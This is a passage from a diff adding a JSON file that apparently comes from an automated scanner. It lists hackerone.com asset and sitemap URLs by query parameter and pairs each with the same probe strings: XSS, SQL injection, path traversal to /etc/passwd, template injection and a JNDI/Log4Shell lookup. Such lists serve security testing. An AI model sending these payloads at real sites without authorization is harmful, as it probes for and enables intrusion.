+        "sample_value": "l",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=m",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "m",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=n",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "n",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=o",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "o",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=p",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "p",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=q",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "q",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=r",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "r",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=s",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "s",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=t",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "t",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=u",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "u",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=v",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "v",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=w",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "w",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=x",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "x",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=y",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "y",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=z",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "z",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_Edq5zLyAUlVP35PQt0bah4mfuHg2C-Rqzw3b0153L90.css?delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "delta",
+        "type": "Unknown / Fuzz",
+        "sample_value": "1",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_Edq5zLyAUlVP35PQt0bah4mfuHg2C-Rqzw3b0153L90.css?delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;language",
+        "type": "Unknown / Fuzz",
+        "sample_value": "en",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_Edq5zLyAUlVP35PQt0bah4mfuHg2C-Rqzw3b0153L90.css?delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;theme",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hackerone",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_Edq5zLyAUlVP35PQt0bah4mfuHg2C-Rqzw3b0153L90.css?delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;include",
+        "type": "Unknown / Fuzz",
+        "sample_value": "eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_HgjmNfXtjkDqwTpKqeJZpKKPd7qdGIcXQqIAAkvAAzI.css?delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "delta",
+        "type": "Unknown / Fuzz",
+        "sample_value": "0",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_HgjmNfXtjkDqwTpKqeJZpKKPd7qdGIcXQqIAAkvAAzI.css?delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;language",
+        "type": "Unknown / Fuzz",
+        "sample_value": "en",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_HgjmNfXtjkDqwTpKqeJZpKKPd7qdGIcXQqIAAkvAAzI.css?delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;theme",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hackerone",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/css/css_HgjmNfXtjkDqwTpKqeJZpKKPd7qdGIcXQqIAAkvAAzI.css?delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "parameter": "amp;include",
+        "type": "Unknown / Fuzz",
+        "sample_value": "eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "scope",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "header",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;delta",
+        "type": "Unknown / Fuzz",
+        "sample_value": "0",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;language",
+        "type": "Unknown / Fuzz",
+        "sample_value": "en",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;theme",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hackerone",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;include",
+        "type": "Unknown / Fuzz",
+        "sample_value": "eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "scope",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "footer",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;delta",
+        "type": "Unknown / Fuzz",
+        "sample_value": "1",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;language",
+        "type": "Unknown / Fuzz",
+        "sample_value": "en",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;theme",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hackerone",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;include",
+        "type": "Unknown / Fuzz",
+        "sample_value": "eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "scope",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "footer",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;delta",
+        "type": "Unknown / Fuzz",
+        "sample_value": "3",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;language",
+        "type": "Unknown / Fuzz",
+        "sample_value": "en",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;theme",
+        "type": "Unknown / Fuzz",
+        "sample_value": "hackerone",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "parameter": "amp;include",
+        "type": "Unknown / Fuzz",
+        "sample_value": "eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/max_500x500/public/2025-09/Website---CTA-Card-%28homepage-What%27s-New%2C-etc.%29-%281%29.png.webp?itok=7fg-7Cc6",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "7fg-7Cc6",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/max_500x500/public/2026-04/1-1.png.webp?itok=9L9qoiZ9",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "9L9qoiZ9",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/max_500x500/public/2026-04/October-2-LinkedIn.png.webp?itok=IK1Z4DD2",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "IK1Z4DD2",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/max_700x700/public/2026-04/Web_FY27Researchers.png.webp?itok=2T6f6bQE",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "2T6f6bQE",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/max_800x800/public/2026-04/Web_FY27-10.png.webp?itok=s2bjV2O5",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "s2bjV2O5",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/Anthropic_light.png.webp?itok=xsxYddJZ",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "xsxYddJZ",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/adobe_dark.png.webp?itok=AM-Wgy0M",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "AM-Wgy0M",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/adobe_light.png.webp?itok=axfXZswU",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "axfXZswU",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/ibm_light.png.webp?itok=f51Y0ZJk",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "f51Y0ZJk",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/paypal_dark.png.webp?itok=-FRJG-cg",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "-FRJG-cg",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/salesforce_dark.png.webp?itok=LR4swYcQ",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "LR4swYcQ",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/salesforce_light.png.webp?itok=QlS8uNrp",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "QlS8uNrp",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/shopify_dark.png.webp?itok=_paHah_E",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
+        "sample_value": "_paHah_E",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/snapchat_dark.png.webp?itok=tW2gr3pi",
+        "parameter": "itok",
+        "type": "Unknown / Fuzz",
